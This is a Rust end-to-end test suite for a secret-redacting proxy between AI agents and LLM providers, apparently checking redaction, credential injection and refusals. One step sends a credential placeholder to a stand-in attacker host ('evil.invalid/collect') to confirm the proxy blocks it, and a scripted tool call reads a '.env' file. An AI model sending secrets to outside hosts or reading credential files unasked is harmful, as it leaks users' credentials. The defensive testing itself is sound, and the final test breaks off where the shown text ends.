// SPDX-License-Identifier: AGPL-3.0-only

//! End to end through the real `scrim-dataplane` binary, started the way the control plane
//! starts it: one end of a socketpair inherited as `--fd`, gRPC over it, a snapshot with
//! generated secrets pushed, then traffic through every listener kind it serves.
//!
//! - Base URL (TCP and Unix socket): an Anthropic Messages request with secrets in a tool
//!   result reaches a fake provider with placeholders only; the streamed answer has the display
//!   value restored in text and every placeholder kept in tool arguments.
//! - Forward proxy (`HTTPS_PROXY`-style `CONNECT` to a provider host): the same, through TLS
//!   interception and the LLM proxy.
//! - Forward proxy toward tool hosts: a placeholder toward the credential's bound host is
//!   injected (and redacted back out of the response); toward any other host it is refused
//!   before anything leaves.
//!
//! Every event, every refusal body and the data plane's own stderr are checked for the
//! generated values.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::too_many_lines,
    missing_docs,
    unreachable_pub
)]

use std::convert::Infallible;
use std::os::fd::AsRawFd;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::body::Incoming;
use hyper_util::rt::TokioIo;
use rcgen::{BasicConstraints, CertificateParams, DnType, IsCa, KeyPair, KeyUsagePurpose};
use rustls::pki_types::pem::PemObject;
use rustls::pki_types::{CertificateDer, PrivateKeyDer, PrivatePkcs8KeyDer, ServerName};
use scrim_llm::testing::{FakeUpstream, Recorded, Scripted, random_value};
use scrim_proto::v1;
use scrim_proto::v1::data_plane_client::DataPlaneClient;
use scrim_redact as rc;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;
use tonic::transport::{Channel, Endpoint};

const TIMEOUT: Duration = Duration::from_secs(10);

/// Generated secrets and the placeholders the data plane must derive for them.
struct Secrets {
    key: Vec<u8>,
    db: String,
    api: String,
    db_ph: String,
    api_ph: String,
}

impl Secrets {
    fn new() -> Self {
        let mut key = vec![0u8; 32];
        rustix::rand::getrandom(&mut key, rustix::rand::GetRandomFlags::empty()).unwrap();
        let db = random_value("pw_");
        let api = random_value("sk_test_");
        let k = rc::PlaceholderKey::new(1, &key).unwrap();
        let db_ph =
            rc::placeholder_for(&k, &rc::RefSlug::new("db-password").unwrap(), db.as_bytes());
        let api_ph =
            rc::placeholder_for(&k, &rc::RefSlug::new("acme-key").unwrap(), api.as_bytes());
        Self {
            key,
            db,
            api,
            db_ph,
            api_ph,
        }
    }

    fn values(&self) -> [&str; 2] {
        [&self.db, &self.api]
    }

    /// `text` with the values masked, for assertion messages: test output never shows a value,
    /// even when a test fails because one leaked.
    fn scrub(&self, text: &str) -> String {
        self.values()
            .iter()
            .fold(text.to_owned(), |t, v| t.replace(v, "<value>"))
    }

    /// Fails when `text` holds either value, raw or base64-encoded.
    fn assert_absent(&self, what: &str, text: &str) {
        for v in self.values() {
            assert!(!text.contains(v), "{what} contains a secret value");
            let b64 = base64(v.as_bytes());
            assert!(
                !text.contains(&b64[..b64.len() - 4]),
                "{what} contains a base64 value"
            );
        }
    }
}

fn base64(b: &[u8]) -> String {
    const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for c in b.chunks(3) {
        let n = (u32::from(c[0]) << 16)
            | (u32::from(*c.get(1).unwrap_or(&0)) << 8)
            | u32::from(*c.get(2).unwrap_or(&0));
        for i in 0..4 {
            if i <= c.len() {
                out.push(A[(n >> (18 - 6 * i) & 63) as usize] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

// ------------------------------------------------------------------ the data plane process

static SPAWN: Mutex<()> = Mutex::new(());

struct DataPlane {
    client: DataPlaneClient<Channel>,
    child: tokio::process::Child,
    stderr: Arc<Mutex<Vec<u8>>>,
    events: Arc<Mutex<Vec<v1::Event>>>,
    events_task: tokio::task::JoinHandle<()>,
}

impl DataPlane {
    /// Starts the binary with the socket as `--fd`, handshakes and subscribes to events.
    async fn launch(extra_ca: &std::path::Path) -> Self {
        let (ours, theirs) = std::os::unix::net::UnixStream::pair().unwrap();
        let child = {
            // Only the one child may inherit its end: clear close-on-exec for the spawn alone.
            let _g = SPAWN.lock().unwrap();
            rustix::io::fcntl_setfd(&theirs, rustix::io::FdFlags::empty()).unwrap();
            let child = tokio::process::Command::new(env!("CARGO_BIN_EXE_scrim-dataplane"))
                .arg("--fd")
                .arg(theirs.as_raw_fd().to_string())
                .env("SCRIM_DP_MLOCK", "off")
                .env("SCRIM_DP_LOG", "debug")
                .env("SCRIM_DP_EXTRA_CA_FILE", extra_ca)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .kill_on_drop(true)
                .spawn()
                .unwrap();
            drop(theirs);
            child
        };
        let mut child = child;
        let stderr = Arc::new(Mutex::new(Vec::new()));
        let mut pipe = child.stderr.take().unwrap();
        let sink = Arc::clone(&stderr);
        tokio::spawn(async move {
            let mut buf = [0u8; 4096];
            while let Ok(n) = pipe.read(&mut buf).await {
                if n == 0 {
                    break;
                }
                sink.lock().unwrap().extend_from_slice(&buf[..n]);
            }
        });

        ours.set_nonblocking(true).unwrap();
        let slot = Arc::new(Mutex::new(Some(
            tokio::net::UnixStream::from_std(ours).unwrap(),
        )));
        let channel = Endpoint::from_static("http://dataplane")
            .connect_with_connector(tower::service_fn(move |_| {
                let s = slot.lock().unwrap().take();
                async move {
                    s.map(TokioIo::new)
                        .ok_or_else(|| std::io::Error::other("already used"))
                }
            }))
            .await
            .unwrap();
        let mut client = DataPlaneClient::new(channel);
        let hello = client
            .hello(v1::HelloRequest {
                protocol: v1::PROTOCOL,
                control_plane_version: "e2e".into(),
            })
            .await
            .unwrap()
            .into_inner();
        assert_eq!(hello.applied_snapshot_version, 0);

        let events = Arc::new(Mutex::new(Vec::new()));
        let mut stream = client
            .events(v1::EventsRequest {
                protocol: v1::PROTOCOL,
            })
            .await
            .unwrap()
            .into_inner();
        let sink = Arc::clone(&events);
        let events_task = tokio::spawn(async move {
            while let Ok(Some(batch)) = stream.message().await {
                sink.lock().unwrap().extend(batch.events);
            }
        });
        Self {
            client,
            child,
            stderr,
            events,
            events_task,
        }
    }

    async fn status(&mut self) -> v1::StatusResponse {
        self.client
            .status(v1::StatusRequest {
                protocol: v1::PROTOCOL,
            })
            .await
            .unwrap()
            .into_inner()
    }

    fn listener(status: &v1::StatusResponse, name: &str) -> String {
        let l = status
            .listeners
            .iter()
            .find(|l| l.name == name)
            .unwrap_or_else(|| panic!("listener {name} missing"));
        assert!(l.bound, "{l:?}");
        l.address.clone()
    }

    /// Waits until an event matches `f`.
    async fn event(&self, what: &str, f: impl Fn(&v1::Event) -> bool) -> v1::Event {
        let deadline = tokio::time::Instant::now() + TIMEOUT;
        loop {
            if let Some(e) = self.events.lock().unwrap().iter().find(|e| f(e)) {
                return e.clone();
            }
            assert!(
                tokio::time::Instant::now() < deadline,
                "no {what} event among {} events",
                self.events.lock().unwrap().len()
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// Closes the control plane's end and checks the process exits cleanly and never wrote a
    /// value to stderr or anything at all to stdout.
    async fn stop(mut self, s: &Secrets) {
        let mut stdout = self.child.stdout.take().unwrap();
        // The open Events call keeps the connection up; end it, then close the socket.
        self.events_task.abort();
        let _ = self.events_task.await;
        drop(self.client);
        let status = tokio::time::timeout(TIMEOUT, self.child.wait())
            .await
            .expect("data plane did not exit after the control plane closed")
            .unwrap();
        assert!(status.success(), "data plane exited with {status}");
        let mut out = Vec::new();
        stdout.read_to_end(&mut out).await.unwrap();
        assert!(out.is_empty(), "the data plane wrote to stdout");
        let err = String::from_utf8_lossy(&self.stderr.lock().unwrap()).into_owned();
        assert!(err.contains("snapshot applied"), "stderr: {err}");
        s.assert_absent("stderr", &err);
        let events = format!("{:?}", self.events.lock().unwrap());
        s.assert_absent("events", &events);
    }
}

// ------------------------------------------------------------------ fakes

/// An Anthropic stream echoing the placeholders the provider received: the display value in
/// text (split across two deltas) and both placeholders in a Bash tool call.
fn provider_stream(rec: &Recorded) -> Scripted {
    let body = String::from_utf8_lossy(&rec.body).into_owned();
    let find = |slug: &str| {
        let open = format!("\u{27e6}scrim:{slug}:");
        body.find(&open).map(|i| {
            let end = body[i..].find('\u{27e7}').unwrap() + i + '\u{27e7}'.len_utf8();
            body[i..end].to_owned()
        })
    };
    let (Some(db), Some(api)) = (find("db-password"), find("acme-key")) else {
        return Scripted::json(400, r#"{"error":"placeholders missing"}"#);
    };
    let (db_a, db_b) = db.split_at(12);
    let cmd = format!("curl -H 'x-api-key: {api}' https://localhost/v1/items && echo {db}");
    let input = serde_json::to_string(&serde_json::json!({ "command": cmd })).unwrap();
    let delta = |index: u32, delta: serde_json::Value| {
        format!(
            "event: content_block_delta\ndata: {}\n\n",
            serde_json::json!({"type":"content_block_delta","index":index,"delta":delta})
        )
    };
    let events = [
        "event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_e2e\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-test\",\"usage\":{\"input_tokens\":1,\"output_tokens\":1}}}\n\n".to_owned(),
        "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n".to_owned(),
        delta(0, serde_json::json!({"type":"text_delta","text":format!("The password is {db_a}")})),
        delta(0, serde_json::json!({"type":"text_delta","text":format!("{db_b} and the key is {api}.")})),
        "event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n".to_owned(),
        "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_e2e\",\"name\":\"Bash\",\"input\":{}}}\n\n".to_owned(),
        delta(1, serde_json::json!({"type":"input_json_delta","partial_json":input})),
        "event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n".to_owned(),
        "event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n".to_owned(),
    ];
    Scripted::sse(events.into_iter().map(Bytes::from).collect())
}

/// What the agent sends: both secrets in a tool result (raw, and the credential base64 too).
fn messages_request(s: &Secrets) -> String {
    serde_json::json!({
        "model": "claude-test",
        "max_tokens": 64,
        "stream": true,
        "messages": [
            {"role": "user", "content": "check the service"},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "toolu_0", "name": "Bash", "input": {"command": "cat .env"}}
            ]},
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_0", "content": format!(
                    "DB_PASSWORD={}\nACME_KEY={}\nACME_KEY_B64={}\n",
                    s.db, s.api, base64(s.api.as_bytes())
                )}
            ]}
        ]
    })
    .to_string()
}

/// Checks what the provider received and what the agent got back.
fn check_llm_round_trip(s: &Secrets, provider: &FakeUpstream, seen_before: usize, body: &str) {
    let got = provider.received();
    assert_eq!(got.len(), seen_before + 1, "the provider got one request");
    let sent = String::from_utf8_lossy(&got[seen_before].body).into_owned();
    s.assert_absent("provider request", &sent);
    assert!(
        sent.contains(&s.db_ph) && sent.contains(&s.api_ph),
        "{}",
        s.scrub(&sent)
    );
    assert_eq!(
        got[seen_before]
            .headers
            .get("x-api-key")
            .map(http::HeaderValue::as_bytes),
        Some(&b"agent-own-provider-key"[..]),
        "the agent's provider credential passes through"
    );

    // Display value restored in text; credential kept; tool arguments keep everything.
    let text = sse_text(body, "text_delta", "text");
    assert!(
        text == format!("The password is {} and the key is {}.", s.db, s.api_ph),
        "agent saw {}",
        s.scrub(&text)
    );
    let args = sse_text(body, "input_json_delta", "partial_json");
    assert!(
        args.contains(&s.api_ph) && args.contains(&s.db_ph),
        "{}",
        s.scrub(&args)
    );
    assert!(
        !args.contains(&s.db) && !args.contains(&s.api),
        "{}",
        s.scrub(&args)
    );
    assert!(!body.contains(&s.api));
}

/// Concatenates `field` of every delta of `kind` in an SSE body.
fn sse_text(body: &str, kind: &str, field: &str) -> String {
    body.lines()
        .filter_map(|l| l.strip_prefix("data: "))
        .filter_map(|d| serde_json::from_str::<serde_json::Value>(d).ok())
        .filter(|v| v["delta"]["type"] == kind)
        .map(|v| v["delta"][field].as_str().unwrap_or_default().to_owned())
        .collect()
}

/// A TLS API server for `localhost` that echoes the `x-api-key` it received.
struct ToolApi {
    port: u16,
    seen: Arc<Mutex<Vec<http::HeaderMap>>>,
}

fn upstream_ca() -> (rcgen::Certificate, KeyPair) {
    let key = KeyPair::generate().unwrap();
    let mut p = CertificateParams::default();
    p.distinguished_name
        .push(DnType::CommonName, "scrim e2e upstream CA");
    p.is_ca = IsCa::Ca(BasicConstraints::Unconstrained);
    p.key_usages = vec![
        KeyUsagePurpose::KeyCertSign,
        KeyUsagePurpose::DigitalSignature,
    ];
    (p.self_signed(&key).unwrap(), key)
}

async fn tool_api(ca: &(rcgen::Certificate, KeyPair)) -> ToolApi {
    let key = KeyPair::generate().unwrap();
    let cert = CertificateParams::new(vec!["localhost".to_owned()])
        .unwrap()
        .signed_by(&key, &ca.0, &ca.1)
        .unwrap();
    let mut cfg = rustls::ServerConfig::builder_with_provider(Arc::new(
        rustls::crypto::ring::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_no_client_auth()
    .with_single_cert(
        vec![cert.der().clone()],
        PrivateKeyDer::Pkcs8(PrivatePkcs8KeyDer::from(key.serialize_der())),
    )
    .unwrap();
    cfg.alpn_protocols = vec![b"http/1.1".to_vec()];
    let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(cfg));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let rec = Arc::clone(&seen);
    tokio::spawn(async move {
        while let Ok((tcp, _)) = listener.accept().await {
            let acceptor = acceptor.clone();
            let rec = Arc::clone(&rec);
            tokio::spawn(async move {
                let Ok(tls) = acceptor.accept(tcp).await else {
                    return;
                };
                let svc = hyper::service::service_fn(move |req: http::Request<Incoming>| {
                    let rec = Arc::clone(&rec);
                    async move {
                        let key = req
                            .headers()
                            .get("x-api-key")
                            .and_then(|v| v.to_str().ok())
                            .unwrap_or_default()
                            .to_owned();
                        rec.lock().unwrap().push(req.headers().clone());
                        let body = serde_json::json!({"items": [], "you_sent": key}).to_string();
                        Ok::<_, Infallible>(
                            http::Response::builder()
                                .header("content-type", "application/json")
                                .body(Full::new(Bytes::from(body)))
                                .unwrap(),
                        )
                    }
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(tls), svc)
                    .await;
            });
        }
    });
    ToolApi { port, seen }
}

// ------------------------------------------------------------------ clients

struct Got {
    status: u16,
    headers: http::HeaderMap,
    body: String,
}

async fn send_http<IO>(io: IO, req: http::Request<Full<Bytes>>) -> Got
where
    IO: AsyncRead + AsyncWrite + Send + Unpin + 'static,
{
    let (mut send, conn) = hyper::client::conn::http1::handshake(TokioIo::new(io))
        .await
        .unwrap();
    tokio::spawn(conn);
    let resp = tokio::time::timeout(TIMEOUT, send.send_request(req))
        .await
        .unwrap()
        .unwrap();
    let (parts, body) = resp.into_parts();
    let body = tokio::time::timeout(TIMEOUT, body.collect())
        .await
        .unwrap()
        .unwrap()
        .to_bytes();
    Got {
        status: parts.status.as_u16(),
        headers: parts.headers,
        body: String::from_utf8_lossy(&body).into_owned(),
    }
}

fn post_messages(path: &str, host: &str, body: String) -> http::Request<Full<Bytes>> {
    http::Request::post(path)
        .header("host", host)
        .header("content-type", "application/json")
        .header("anthropic-version", "2023-06-01")
        .header("x-api-key", "agent-own-provider-key")
        .body(Full::new(Bytes::from(body)))
        .unwrap()
}

/// `CONNECT host:port` through the forward proxy, then TLS trusting scrim's CA, as a client with
/// `HTTPS_PROXY` set does.
async fn via_proxy(
    proxy: &str,
    ca_pem: &str,
    host: &str,
    port: u16,
    req: http::Request<Full<Bytes>>,
) -> Got {
    let mut tcp = TcpStream::connect(proxy).await.unwrap();
    tcp.write_all(
        format!("CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n").as_bytes(),
    )
    .await
    .unwrap();
    let mut head = Vec::new();
    let mut b = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        assert_eq!(
            tcp.read(&mut b).await.unwrap(),
            1,
            "proxy closed during CONNECT"
        );
        head.push(b[0]);
    }
    assert!(
        head.starts_with(b"HTTP/1.1 200"),
        "{}",
        String::from_utf8_lossy(&head)
    );
    let mut roots = rustls::RootCertStore::empty();
    for c in CertificateDer::pem_slice_iter(ca_pem.as_bytes()) {
        roots.add(c.unwrap()).unwrap();
    }
    let mut cfg = rustls::ClientConfig::builder_with_provider(Arc::new(
        rustls::crypto::ring::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_root_certificates(roots)
    .with_no_client_auth();
    cfg.alpn_protocols = vec![b"http/1.1".to_vec()];
    let tls = tokio_rustls::TlsConnector::from(Arc::new(cfg))
        .connect(ServerName::try_from(host.to_owned()).unwrap(), tcp)
        .await
        .unwrap();
    send_http(tls, req).await
}

// ------------------------------------------------------------------ the test

fn snapshot(
    s: &Secrets,
    provider: &FakeUpstream,
    api_port: u16,
    unix: &std::path::Path,
) -> v1::Snapshot {
    let mut db = v1::ValueEntry::default();
    db.r#ref = "bao://kv/app#db_password".into();
    db.slug = "db-password".into();
    db.value = s.db.as_bytes().to_vec();
    db.class = v1::ValueClass::Display.into();
    let mut api = v1::ValueEntry::default();
    api.r#ref = "bao://kv/app#acme_key".into();
    api.slug = "acme-key".into();
    api.name = "acme".into();
    api.value = s.api.as_bytes().to_vec();
    api.class = v1::ValueClass::Credential.into();
    api.bound_hosts = vec![format!("localhost:{api_port}")];
    api.inject_locations = vec!["header:x-api-key".into()];
    let mut key = v1::PlaceholderKey::default();
    key.version = 1;
    key.key.clone_from(&s.key);
    key.current = true;
    let listener = |name: &str, kind: v1::ListenerKind, address: &str| v1::Listener {
        name: name.into(),
        kind: kind.into(),
        address: address.into(),
    };
    v1::Snapshot {
        protocol: v1::PROTOCOL,
        version: 1,
        values: vec![db, api],
        placeholder_keys: vec![key],
        policy: Some(v1::Policy {
            default_effect: v1::Effect::Deny.into(),
            ..Default::default()
        }),
        routes: vec![v1::Route {
            name: "anthropic".into(),
            provider: "anthropic".into(),
            upstream: provider.url(),
            hosts: vec!["api.anthropic.com".into()],
            path_prefix: "/anthropic".into(),
            chain: None,
        }],
        listeners: vec![
            listener("base", v1::ListenerKind::BaseUrl, "127.0.0.1:0"),
            listener("sock", v1::ListenerKind::Unix, &unix.display().to_string()),
            listener("proxy", v1::ListenerKind::ForwardProxy, "127.0.0.1:0"),
        ],
        ..Default::default()
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn secrets_never_reach_the_provider_and_credentials_reach_only_bound_hosts() {
    let s = Secrets::new();
    let dir = std::path::PathBuf::from(env!("CARGO_TARGET_TMPDIR"))
        .join(format!("scrim-e2e-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let ca = upstream_ca();
    let ca_file = dir.join("upstream-ca.pem");
    std::fs::write(&ca_file, ca.0.pem()).unwrap();
    let unix = dir.join("llm.sock");

    let provider = FakeUpstream::start_with(provider_stream).await;
    let api = tool_api(&ca).await;
    let mut dp = DataPlane::launch(&ca_file).await;

    // Nothing is served before the first snapshot.
    let st = dp.status().await;
    assert!(!st.ready && st.listeners.is_empty() && st.redaction.is_none());

    let applied = dp
        .client
        .apply_snapshot(snapshot(&s, &provider, api.port, &unix))
        .await
        .unwrap()
        .into_inner();
    assert_eq!((applied.applied_version, applied.value_count), (1, 2));
    let st = dp.status().await;
    assert!(st.ready, "{}", s.scrub(&format!("{st:?}")));
    assert_eq!(st.applied_snapshot_version, 1);
    assert_eq!(st.policy_engine, "standin/v1");
    assert_eq!(
        st.redaction.as_ref().map(|r| r.engine.as_str()),
        Some("aho-corasick")
    );
    assert!(st.tool_proxy.as_ref().is_some_and(|t| t.ready));
    let base = DataPlane::listener(&st, "base");
    let proxy = DataPlane::listener(&st, "proxy");
    let ca_pem = st.ca_trust_bundle_pem.clone();

    // 1. Base URL over TCP.
    let got = send_http(
        TcpStream::connect(&base).await.unwrap(),
        post_messages("/anthropic/v1/messages", &base, messages_request(&s)),
    )
    .await;
    assert_eq!(got.status, 200, "{}", s.scrub(&got.body));
    check_llm_round_trip(&s, &provider, 0, &got.body);

    // 2. Base URL over the Unix socket.
    let got = send_http(
        tokio::net::UnixStream::connect(&unix).await.unwrap(),
        post_messages("/anthropic/v1/messages", "localhost", messages_request(&s)),
    )
    .await;
    assert_eq!(got.status, 200, "{}", s.scrub(&got.body));
    check_llm_round_trip(&s, &provider, 1, &got.body);

    // 3. HTTPS_PROXY to the provider host: intercepted and run through the LLM proxy.
    let got = via_proxy(
        &proxy,
        &ca_pem,
        "api.anthropic.com",
        443,
        post_messages("/v1/messages", "api.anthropic.com", messages_request(&s)),
    )
    .await;
    assert_eq!(got.status, 200, "{}", s.scrub(&got.body));
    check_llm_round_trip(&s, &provider, 2, &got.body);

    // 4. The tool call the model made: the placeholder toward the bound host is injected...
    let req = http::Request::get("/v1/items")
        .header("host", format!("localhost:{}", api.port))
        .header("x-api-key", &s.api_ph)
        .body(Full::new(Bytes::new()))
        .unwrap();
    let got = via_proxy(&proxy, &ca_pem, "localhost", api.port, req).await;
    assert_eq!(got.status, 200, "{}", s.scrub(&got.body));
    let seen = api.seen.lock().unwrap().clone();
    assert_eq!(seen.len(), 1);
    assert!(
        seen[0].get("x-api-key").map(http::HeaderValue::as_bytes) == Some(s.api.as_bytes()),
        "the bound host must receive the real credential"
    );
    // ...and the API's echo of it comes back as the placeholder.
    s.assert_absent("tool response", &got.body);
    assert!(got.body.contains(&s.api_ph), "{}", s.scrub(&got.body));

    // 5. ...and toward any other host it is refused before anything leaves.
    let req = http::Request::get("/collect")
        .header("host", "evil.invalid")
        .header("x-api-key", &s.api_ph)
        .body(Full::new(Bytes::new()))
        .unwrap();
    let got = via_proxy(&proxy, &ca_pem, "evil.invalid", 443, req).await;
    assert_eq!(got.status, 403, "{}", s.scrub(&got.body));
    assert_eq!(
        got.headers
            .get("x-scrim-error")
            .map(http::HeaderValue::as_bytes),
        Some(&b"unbound_destination"[..])
    );
    s.assert_absent("refusal", &got.body);
    assert_eq!(
        api.seen.lock().unwrap().len(),
        1,
        "nothing else reached an upstream"
    );
    assert_eq!(provider.received().len(), 3);

    // 6. Secrets outside the body: a custom header (quoted, and base64) and a query parameter
    // with every byte percent-encoded reach the provider only as placeholders; the agent's own
    // provider key passes through untouched.
    let pct = s.db.bytes().fold(String::new(), |mut acc, b| {
        use std::fmt::Write as _;
        let _ = write!(acc, "%{b:02X}");
        acc
    });
    let mut req = post_messages(
        &format!("/anthropic/v1/messages?beta=true&trace={pct}"),
        &base,
        messages_request(&s),
    );
    let h = req.headers_mut();
    h.insert(
        "x-debug-context",
        format!("db=\"{}\"; key={}", s.db, s.api).parse().unwrap(),
    );
    h.insert(
        "x-debug-b64",
        base64(format!("ACME_KEY={}", s.api).as_bytes())
            .parse()
            .unwrap(),
    );
    let got = send_http(TcpStream::connect(&base).await.unwrap(), req).await;
    assert_eq!(got.status, 200, "{}", s.scrub(&got.body));
    let rec = &provider.received()[3];
    let decoded: String = {
        let b = rec.uri.as_bytes();
        let mut out = Vec::new();
        let mut i = 0;
        while i < b.len() {
            if b[i] == b'%' && i + 2 < b.len() {
                out.push(
                    u8::from_str_radix(std::str::from_utf8(&b[i + 1..i + 3]).unwrap(), 16).unwrap(),
                );
                i += 3;
            } else {
                out.push(b[i]);
                i += 1;
            }
        }
        String::from_utf8(out).unwrap()
    };
    s.assert_absent("provider request target", &decoded);
    assert!(decoded.contains(&s.db_ph), "{}", s.scrub(&decoded));
    assert!(
        rec.uri.contains("beta=true&trace="),
        "{}",
        s.scrub(&rec.uri)
    );
    for name in ["x-debug-context", "x-debug-b64"] {
        let v = String::from_utf8_lossy(rec.headers[name].as_bytes()).into_owned();
        s.assert_absent(name, &v);
    }
    let ctx = String::from_utf8_lossy(rec.headers["x-debug-context"].as_bytes()).into_owned();
    assert!(
        ctx == format!("db=\"{}\"; key={}", s.db_ph, s.api_ph),
        "{}",
        s.scrub(&ctx)
    );
    assert_eq!(
        rec.headers
            .get("x-api-key")
            .map(http::HeaderValue::as_bytes),
        Some(&b"agent-own-provider-key"[..]),
        "the agent's provider credential passes through"
    );
    assert_eq!(provider.received().len(), 4);

    // Every redaction, restore, injection and refusal reached the Events stream.
    let ev = dp
        .event("LLM redaction", |e| {
            e.kind() == v1::EventKind::Redaction
                && e.attrs.get("source").map(String::as_str) == Some("llm")
        })
        .await;
    assert!(ev.count >= 3, "{}", s.scrub(&format!("{ev:?}")));
    assert_eq!(ev.snapshot_version, 1);
    assert!(
        ev.attrs["refs"].contains("bao://kv/app#acme_key"),
        "{}",
        s.scrub(&format!("{ev:?}"))
    );
    let ev = dp
        .event("restore", |e| e.kind() == v1::EventKind::Restore)
        .await;
    assert!(ev.count >= 1, "{}", s.scrub(&format!("{ev:?}")));
    let ev = dp
        .event("injection", |e| e.kind() == v1::EventKind::Injection)
        .await;
    assert!(
        ev.target.contains("localhost"),
        "{}",
        s.scrub(&format!("{ev:?}"))
    );
    let ev = dp
        .event("refusal", |e| {
            e.kind() == v1::EventKind::Error
                && e.attrs.get("code").map(String::as_str) == Some("unbound_destination")
        })
        .await;
    assert_eq!(ev.effect(), v1::Effect::Deny);

    dp.stop(&s).await;
    assert!(!unix.exists(), "the Unix socket is removed at shutdown");
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn break_glass_injects_nothing_and_restores_nothing() {
    let s = Secrets::new();
    let dir = std::path::PathBuf::from(env!("CARGO_TARGET_TMPDIR"))
        .join(format!("scrim-e2e-bg-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let ca = upstream_ca();
    let ca_file = dir.join("upstream-ca.pem");
    std::fs::write(&ca_file, ca.0.pem()).unwrap();
    let unix = dir.join("llm.sock");
    let provider = FakeUpstream::start_with(provider_stream).await;
    let api = tool_api(&ca).await;
    let mut dp = DataPlane::launch(&ca_file).await;

    let mut snap = snapshot(&s, &provider, api.port, &unix);
    snap.policy = Some(v1::Policy {
        break_glass: true,
        ..Default::default()
    });
    dp.client.apply_snapshot(snap).await.unwrap();
    let st = dp.status().await;
    assert!(st.ready, "{}", s.scrub(&format!("{st:?}")));
    let base = DataPlane::listener(&st, "base");
    let proxy = DataPlane::listener(&st, "proxy");

    // Redaction continues; nothing is restored.
    let got = send_http(
        TcpStream::connect(&base).await.unwrap(),
        post_messages("/anthropic/v1/messages", &base, messages_request(&s)),
    )
    .await;
    assert_eq!(got.status, 200, "{}", s.scrub(&got.body));
    s.assert_absent(
        "provider request",
        &String::from_utf8_lossy(&provider.received()[0].body),
    );
    let text = sse_text(&got.body, "text_delta", "text");
    assert!(
        text == format!("The password is {} and the key is {}.", s.db_ph, s.api_ph),
        "agent saw {}",
        s.scrub(&text)
    );

    // Nothing is injected, even toward the bound host.
    let req = http::Request::get("/v1/items")
        .header("host", format!("localhost:{}", api.port))
        .header("x-api-key", &s.api_ph)
        .body(Full::new(Bytes::new()))
        .unwrap();
    let got = via_proxy(&proxy, &st.ca_trust_bundle_pem, "localhost", api.port, req).await;
    assert_eq!(got.status, 403, "{}", s.scrub(&got.body));
    assert!(api.seen.lock().unwrap().is_empty());

    dp.stop(&s).await;
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn engines_refuse_before_the_first_snapshot() {
    let shared = Arc::new(scrim_dataplane::engine::Shared::new().unwrap());
    let provider = FakeUpstream::start(Scripted::json(200, "{}")).await;
    let req = http::Request::post("/anthropic/v1/messages")
        .header("content-type", "application/json")
        .body(Full::new(Bytes::from_static(br#"{"messages":[]}"#)))
        .unwrap();
    let resp = shared.llm.handle(req).await;
    assert_eq!(resp.status(), 503);
    assert_eq!(
        resp.headers()
            .get("x-scrim-error")
            .map(http::HeaderValue::as_bytes),
        Some(&b"not_ready"[..])
    );
    assert!(provider.received().is_empty());
    assert!(!shared.tool_proxy.status().ready);
}

#[tokio::test(flavor = "multi_thread")]
async fn every_engine_reads_one_bundle_version() {
    let s = Secrets::new();
    let shared = Arc::new(scrim_dataplane::engine::Shared::new().unwrap());
    let provider = FakeUpstream::start(Scripted::json(200, "{}")).await;
    let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
    // Readers check, while snapshots are applied as fast as possible, that what the LLM proxy
    // and the tool proxy see always belongs to one version.
    let readers: Vec<_> = (0..4)
        .map(|_| {
            let shared = Arc::clone(&shared);
            let stop = Arc::clone(&stop);
            std::thread::spawn(move || {
                let mut seen = 0u64;
                while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                    if let Some(b) = shared.snapshot.load_full() {
                        assert_eq!(b.llm.version, b.version);
                        assert_eq!(b.tool_proxy.version(), b.version);
                        assert_eq!(b.applied.version, b.version);
                        assert!(b.version >= seen, "versions go back");
                        seen = b.version;
                        // The engines read the same swap.
                        let llm = shared.llm.snapshots().load().map_or(0, |l| l.version);
                        let tools = shared.tool_proxy.status().snapshot_version.unwrap_or(0);
                        assert!(llm >= b.version && tools >= b.version);
                    }
                }
            })
        })
        .collect();
    for version in 1..=40 {
        let mut snap = snapshot(&s, &provider, 1, std::path::Path::new("/nonexistent"));
        snap.version = version;
        snap.listeners.clear();
        shared.apply(snap).await.unwrap();
        assert_eq!(
            shared.llm.snapshots().load().map(|l| l.version),
            Some(version)
        );
        assert_eq!(shared.tool_proxy.status().snapshot_version, Some(version));
    }
